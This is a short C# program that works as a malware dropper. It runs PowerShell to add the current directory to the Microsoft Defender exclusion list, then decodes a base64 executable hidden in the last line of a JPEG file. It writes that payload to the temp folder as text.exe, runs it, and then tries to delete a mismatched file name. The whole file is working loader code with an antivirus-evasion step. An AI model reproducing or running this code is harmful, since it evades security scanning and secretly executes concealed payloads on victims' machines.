using System.IO;
using System.Linq;
using System.Diagnostics;
using System;

public class MyClass
{
    public static void Main()
    {
        string path_current = Directory.GetCurrentDirectory();

        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
        pstest.Start();
        string path = Path.GetTempPath();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "text.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "text.exe";
        ps.Start();
        File.Delete(path + "test.exe");
    }
}